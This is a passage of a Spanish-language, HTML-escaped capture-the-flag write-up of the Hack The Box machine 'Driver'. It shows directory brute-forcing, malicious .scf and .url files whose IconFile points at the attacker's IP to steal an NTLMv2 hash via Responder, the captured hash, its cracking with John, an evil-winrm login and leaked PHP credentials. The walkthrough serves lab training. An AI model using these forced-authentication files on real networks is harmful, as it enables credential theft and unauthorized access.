&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;___ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_,    &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/ / &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__/ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;___
by Ben &lt;span class=&#34;s2&#34;&gt;&amp;#34;epi&amp;#34;&lt;/span&gt; Risher ü§ì                 ver: 2.3.3
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üéØ  Target Url            ‚îÇ http://driver.htb/
 üöÄ  Threads               ‚îÇ &lt;span class=&#34;m&#34;&gt;50&lt;/span&gt;
 üìñ  Wordlist              ‚îÇ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 üëå  Status Codes          ‚îÇ &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200, 204, 301, 302, 307, 308, 401, 403, 405, 500&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
 üí•  Timeout &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;        ‚îÇ &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;
 ü¶°  User-Agent            ‚îÇ feroxbuster/2.3.3
 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml
 ü§Ø  Header                ‚îÇ Authorization:  Basic &lt;span class=&#34;nv&#34;&gt;YWRtaW46YWRtaW4&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;
 üí≤  Extensions            ‚îÇ &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;php&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
 üîÉ  Recursion Depth       ‚îÇ &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ENTER&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; to use the Scan Cancel Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
&lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;        2l       10w      148c http://driver.htb/images
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      185l      379w     4279c http://driver.htb/index.php
&lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;        2l       10w      148c http://driver.htb/Images
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      185l      379w     4279c http://driver.htb/Index.php
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;user---tony&#34;&gt;User - Tony&lt;/h1&gt;
&lt;p&gt;El sitio web nos permite subir archivos, intentamos con diferentes formatos pero parece ser que ninguno es ejecutado o movido a algun otro directorio. Al investigar sobre ataques por archivos en SMB, encontramos &lt;a href=&#34;https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/&#34;&gt;SCF File Attacks&lt;/a&gt;. Dicho ataque utiliza una &lt;a href=&#34;https://www.pcmag.com/encyclopedia/term/unc&#34;&gt;direccion UNC&lt;/a&gt; o direccion de recurso definida en &lt;code&gt;IconFile&lt;/code&gt; dentro de un archivo &lt;code&gt;.scf&lt;/code&gt;, al colocar este archivo en un recurso y un usuario al acceder a este, el archivo es ejecutado y, el usuario intenta acceder al recurso definido (&lt;code&gt;IconFile&lt;/code&gt;) lo que hace que se autentique en el recurso y al tener responder en ejecuci√≥n es posible capturar el hash de autenticaci√≥n del usuario.&lt;/p&gt;
&lt;p&gt;Replicamos este ataque, creando un archivo que contenga nuestra direccion IP.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/driver ‚ùØ cat scx.scf
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Shell&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;Command&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;IconFile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;10.10.10.15&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ckull.ico
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Taskbar&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;Command&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ToggleDesktop
 œÄ ~/htb/driver ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ejecutamos responder, subimos el archivo y tras unos segundos vemos que el usuario &lt;code&gt;tony&lt;/code&gt; accede al recurso, con ello obtuvimos el hash ntlm.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SMB&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; NTLMv2-SSP Client   : 10.10.11.106
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SMB&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; NTLMv2-SSP Username : DRIVER&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SMB&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; NTLMv2-SSP Hash     : tony::DRIVER:0b940ebf05184c8d:2CEA298880C79699FAED0D1BD590BA8E:010100000000000080A2972CCEB7D70160670D2514033A9300000000020008003600340030004D0001001E00570049004E002D005600440041005600410041004300580055003700530004003400570049004E002D00560044004100560041004100430058005500370053002E003600340030004D002E004C004F00430041004C00030014003600340030004D002E004C004F00430041004C00050014003600340030004D002E004C004F00430041004C000700080080A2972CCEB7D70106000400020000000800300030000000000000000000000000200000D7D5A09B6D6231233A414B29A11FD4730FD7091D7057F8686380C4839199EAF50A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0033003000000000000000000000000000
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Skipping previously captured &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; DRIVER&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Skipping previously captured &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; DRIVER&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Skipping previously captured &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; DRIVER&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;crack-hash&#34;&gt;Crack Hash&lt;/h2&gt;
&lt;p&gt;Utilizamos John con el wordlist rockyou.txt para crackear el hash de tony.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/driver ‚ùØ john --wordlist&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ROCK&lt;/span&gt; hash_tony
Using default input encoding: UTF-8
Loaded &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; password &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;netntlmv2, NTLMv2 C/R &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MD4 HMAC-MD5 32/64&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
Will run &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; OpenMP threads
Press &lt;span class=&#34;s1&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; status
liltony          &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;tony&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
1g 0:00:00:00 DONE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2021-10-02 20:44&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 9.090g/s 297890p/s 297890c/s 297890C/s !!!!!!..eatme1
Use the &lt;span class=&#34;s2&#34;&gt;&amp;#34;--show --format=netntlmv2&amp;#34;&lt;/span&gt; options to display all of the cracked passwords reliably
Session completed
 œÄ ~/htb/driver ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;shell&#34;&gt;Shell&lt;/h2&gt;
&lt;p&gt;nmap mostr√≥ que el puerto WinRM esta abierto, utilizamos las credenciales que obtuvimos para acceder por este puerto utilizando &lt;code&gt;evil-winrm&lt;/code&gt;, logrando obtener la flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/driver ‚ùØ evil-winrm -i driver.htb -u tony -p liltony

Evil-WinRM shell v3.3

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; whoami
driver&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony
*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; ..&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt;ser.txt
4d5bc94c1589f8e3d3bbc7ef748c97e6
*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;url&#34;&gt;.URL&lt;/h2&gt;
&lt;p&gt;De igual forma utilizando un archivo &lt;a href=&#34;https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-url&#34;&gt;.url&lt;/a&gt; funciona para obtener el hash de tony.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;InternetShortcut&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;URL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;whatever
&lt;span class=&#34;nv&#34;&gt;WorkingDirectory&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;whatever
&lt;span class=&#34;nv&#34;&gt;IconFile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;10.10.10.15&lt;span class=&#34;se&#34;&gt;\%&lt;/span&gt;USERNAME%.icon
&lt;span class=&#34;nv&#34;&gt;IconIndex&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;web-site-1&#34;&gt;Web Site&lt;/h2&gt;
&lt;p&gt;En el directorio &lt;code&gt;inetpub\&lt;/code&gt; encontramos el codigo fuente de la p√°gina, vemos que esta definido el tipo de &lt;a href=&#34;https://www.php.net/manual/es/features.http-auth.php&#34;&gt;autenticacion por http&lt;/a&gt; y se muestran las credenciales, adem√°s vemos que el directorio donde se almacenan los archivos es &lt;code&gt;C:\firmwares\&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\i&lt;/span&gt;netpub&lt;span class=&#34;se&#34;&gt;\w&lt;/span&gt;wwroot&amp;gt; dir -Force


    Directory: C:&lt;span class=&#34;se&#34;&gt;\i&lt;/span&gt;netpub&lt;span class=&#34;se&#34;&gt;\w&lt;/span&gt;wwroot


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         9/7/2021  11:29 PM                images
-a----         9/8/2021   5:06 AM           &lt;span class=&#34;m&#34;&gt;6136&lt;/span&gt; fw_up.php
-a----         9/8/2021   4:51 AM           &lt;span class=&#34;m&#34;&gt;4906&lt;/span&gt; index.php


*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\i&lt;/span&gt;netpub&lt;span class=&#34;se&#34;&gt;\w&lt;/span&gt;wwroot&amp;gt; cat fw_up.php

&amp;lt;?php
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; isset&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;PHP_AUTH_USER&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;PHP_AUTH_USER&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; AND
      &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; isset&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;PHP_AUTH_PW&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;PHP_AUTH_PW&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;REQUEST_METHOD&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]==&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;){&lt;/span&gt;
